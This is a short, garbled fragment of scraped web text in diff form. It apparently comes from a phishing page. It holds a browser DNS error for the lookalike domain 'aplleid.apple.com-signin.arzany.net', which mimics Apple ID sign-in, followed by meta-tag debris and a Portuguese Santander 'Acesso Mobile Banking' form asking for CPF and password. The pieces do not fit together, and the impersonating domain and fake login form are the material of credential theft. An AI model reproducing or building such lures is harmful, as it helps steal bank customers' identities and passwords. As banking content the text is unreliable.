@@ -1,0 +1,16 @@
+aplleid.apple.com-signin.arzany.netThis site can’t be reached
+aplleid.apple.com-signin.arzany.net’s server DNS address could not be found.
+Try:
+Checking the connection
+Checking the proxy, firewall, and DNS configuration
+Running Windows Network Diagnostics
+ERR_NAME_NOT_RESOLVED
+Reload
+DETAILS   width=device-width, initial-scale=1.0,
+                                 maximum-scale=1.0, user-scalable=no
+Acesso Mobile Banking
+CPF:
+SENHA:
+CONTINUAR
+Todos direitos reservados
+www.santander.com.br   width=device-width, initial-scale=1.0 width=device-width, user-scalable=false;
